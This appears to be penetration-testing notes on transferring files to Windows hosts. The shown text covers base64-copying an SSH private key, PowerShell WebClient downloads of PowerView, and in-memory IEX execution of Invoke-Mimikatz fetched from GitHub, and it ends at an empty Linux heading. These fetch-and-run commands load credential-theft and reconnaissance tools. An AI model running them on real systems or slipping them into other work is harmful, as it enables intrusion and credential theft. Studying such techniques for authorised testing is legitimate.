# Windows File Transfers

## PowerShell Base64 Encode & Decode

If a file is small in size, we can encode a file to base64 string, copy its content from the terminal and perform the reverse operation decoding the file in the original content

Primary usage: If the file content is very small in size and we have access to the terminal

### Encode file content to base64

```bash
cat id_rsa |base64 -w 0;echo
```

Copy this to a windows powershell ans use it to decode it

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("STRING"))
```

## PowerShell Web Downloads

PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

| Method | Description |
| :----- | :---------- |
| OpenRead | Returns the data from a resource as a Stream. |
| OpenReadAsync | Returns the data from a resource without blocking the calling thread. |
| DownloadData | Downloads data from a resource and returns a Byte array. |
| DownloadDataAsync | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile | Downloads data from a resource to a local file. |
| DownloadFileAsync | Downloads data from a resource to a local file without blocking the calling thread. |
| DownloadString | Downloads a String from a resource and returns a String. |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread. |

### PowerShell DownloadFile Method

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

**Example**

```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

### PowerShell DownloadString - Fileless Method

Fileless method means that we can use a file and executing it without saving the file itself to the disk. We can run it directly in memory using the Invoke-Expression cmdlet ot it's alias IEX

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

Can be used to download files, we can also use its aliases iwr, curl, wget instead of the Invoke-WebRequest

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```


# Linux File Transfers
